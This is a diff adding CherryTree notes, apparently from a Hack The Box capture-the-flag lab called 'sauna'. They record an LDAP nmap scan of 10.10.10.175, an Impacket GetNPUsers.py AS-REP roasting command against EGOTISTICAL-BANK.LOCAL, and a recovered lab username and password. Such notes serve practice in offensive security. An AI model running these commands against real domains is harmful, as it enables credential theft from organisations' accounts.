@@ -1,0 +1,17 @@
+<?xml version="1.0" ?>
+<cherrytree>
+	<node custom_icon_id="0" foreground="" is_bold="False" name="sauna" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586296212.87" ts_lastsave="1586296216.38" unique_id="1">
+		<rich_text>
+domain name = EGOTISTICAL-BANK.LOCAL
+
+
+nmap -p 389 --script ldap* 10.10.10.175
+
+go on website and add all users to a file.
+
+GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile users.txt -outputfile hash.txt -format john
+
+fsmith
+Thestrokes23</rich_text>
+	</node>
+</cherrytree>
